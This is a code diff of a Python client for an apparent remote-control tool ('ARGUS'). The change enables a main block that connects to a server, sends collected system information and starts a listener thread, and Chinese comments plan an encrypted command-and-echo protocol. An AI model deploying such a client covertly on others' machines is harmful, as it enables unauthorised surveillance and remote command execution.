@@ -7,6 +7,7 @@ import netifaces
 import uuid
 import os
 import platform
+import threading
 
 import psutil
 import win32api
@@ -23,10 +24,10 @@ client_id = ""
 # 1. 直接操作被控制端窗口属性，网络状态等Python函数操作
 # 2. 传输指令和回显需要加密
 # 3. 部分涉及到程序自身资源调配的指令，需要专门编写
-# TODO: 设计一个自主协议，区分CMD指令，Pthon函数直接调用和程序调配。  因此就需要先抓包，看看数据包情况。
+# TODO: 设计一个自主协议，区分CMD指令，Python函数直接调用和程序调配。  因此就需要先抓包，看看数据包情况。
 # 大致设想：
-# {FLAG:ARGUS, SENDER:SERVER, TYPE:CMD_Command, UUID:"", CONTENT:"", VERSION:"", MSG_ID:""}
-# {FLAG:ARGUS, SENDER:CLIENT, TYPE:CMD_Command_Echo, UUID:"", CONTENT:"", VERSION:"", MSG_ID:""}
+# {FLAG:ARGUS, SENDER:SERVER, TYPE:CMD_Command, UUID:"", VERSION:"", MSG_ID:"", CONTENT:""}
+# {FLAG:ARGUS, SENDER:CLIENT, TYPE:CMD_Command_Echo, UUID:"", VERSION:"", MSG_ID:"", CONTENT:""}
 
 
 def get_comp_info():
@@ -271,25 +272,24 @@ def execute_command(command):
 
 
 if __name__ == "__main__":
-    # try:
-    #     client_id = generate_uuid()
-    #     print(client_id)
-    #     info_socket = initialize_socket(server_ip, server_inform_port)
-    #
-    #     comprehension_info = get_comp_info()
-    #     get_info_thread = threading.Thread(target=get_info, args=(info_socket,))
-    #     # 多线程，将监听端口单独放出，便于管理
-    #     get_info_thread.start()
-    #     send_info(info_socket, comprehension_info)
+    try:
+        client_id = generate_uuid()
+        print(client_id)
+        info_socket = initialize_socket(server_ip, server_inform_port)
 
-    #
-    # except KeyboardInterrupt:
-    #     print("User Ended The Connection.Global.")
-    # except Exception as e:
-    #     print("Error, code:" + str(e))
+        comprehension_info = get_comp_info()
+        get_info_thread = threading.Thread(target=get_info, args=(info_socket,))
+        # 多线程，将监听端口单独放出，便于管理
+        get_info_thread.start()
+        send_info(info_socket, comprehension_info)
+
+    except KeyboardInterrupt:
+        print("User Ended The Connection.Global.")
+    except Exception as e:
+        print("Error, code:" + str(e))
 
     #     # # # Debug Area Below # # #
-    print(get_comp_info())
-    print(get_all_windows())
+    # print(get_comp_info())
+    # print(get_all_windows())
     #     # connect_to_server(server_ip, server_command_port)
     #     # # # Debug Area Above # # #
